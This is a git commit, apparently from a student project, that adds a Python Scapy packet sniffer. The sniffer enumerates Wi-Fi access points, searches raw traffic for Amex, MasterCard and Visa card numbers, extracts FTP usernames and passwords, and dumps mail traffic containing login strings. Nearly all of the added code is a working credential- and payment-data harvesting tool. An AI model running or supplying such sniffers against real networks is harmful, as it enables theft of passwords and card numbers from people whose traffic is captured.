94245dd291e953adb5da29f018fe1547269d5aff
c0mix <lorenzo.comi@studenti.unimi.it>
2017-01-31 23:47:51 +0100

    terzo commitment

--- Sniffer.py
+++ Sniffer.py
@@ -1,17 +1,65 @@
+from scapy.all import *
+
+# Console colors
+W = '\033[0m'  # white (normal)
+R = '\033[31m' # red
+G = '\033[32m' # green
+O = '\033[33m' # orange
+B = '\033[34m' # blue
+P = '\033[35m' # purple
+C = '\033[36m' # cyan
+T = '\033[93m' # tan
+ast = '['+B+'*'+W+'] '
+min = '['+R+'-'+W+'] '
+plu = '['+G+'+'+W+'] '
+
+ap_list = []
 
 
-class Sniffer(object):
-    """
-    This module provides multiple sniffing and filtering options
-    """
+def ssidSniffer(pkt):
+    if pkt.haslayer(Dot11):
+        if pkt.type == 0 and pkt.subtype == 8:
+            if pkt.addr2 not in ap_list:
+                ap_list.append(pkt.addr2)
+                print "AP MAC: %s with SSID: %s " % (pkt.addr2, pkt.info)
 
-    def __init__(self, interface):
-        self.interface = interface
-        print interface
-        exit('ciao')
 
-    def listDevice(self, macAddresses):
-        s = manuf.MacParser()
-        for item in macAddresses:
-            res = s.get_all(item)
-            print res
+def Airodump(pkt):
+    cmd = "airodump-ng "
+    print '[INFO] Looking for a Wlan interface'
+
+
+def sendibleDataSniff(pkt):
+    raw = pkt.sprintf('%Raw.load%')
+    americaRE = re.findall('3[47][0-9]{13}', raw)
+    masterRE = re.findall('5[1-5][0-9]{14}', raw)
+    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
+
+    if americaRE:
+        print G+'[INFO]'+W+' Found American Express Card: ' + americaRE[0]
+    if masterRE:
+        print G+'[INFO]'+W+' Found MasterCard Card: ' + masterRE[0]
+    if visaRE:
+        print G+'[INFO]'+W+' Found Visa Card: ' + visaRE[0]
+
+
+def ftpSniff(pkt):
+    dest = pkt.getlayer(IP).dst
+    raw = pkt.sprintf('%Raw.load%')
+    user = re.findall('(?i)USER (.*)', raw)
+    pswd = re.findall('(?i)PASS (.*)', raw)
+
+    if user:
+        print G+'[INFO]'+W+' Detected FTP Login to ' + str(dest)
+        print G+'[INFO]'+W+' User account: ' + str(user[0])
+    elif pswd:
+        print G+'[INFO]'+W+' Password: ' + str(pswd[0])
+
+
+def mailSniff(pkt):
+    # check to make sure it has a data payload
+    if pkt[TCP].payload:
+        mailpkt = str(pkt[TCP].payload)
+        if 'user' in mailpkt.lower() or 'pass' in mailpkt.lower():
+            print G+'[INFO]'+W+' Server: %s' % pkt[IP].dst
+            print G+'[INFO]'+W+' Mail: %s' %pkt[TCP].payload
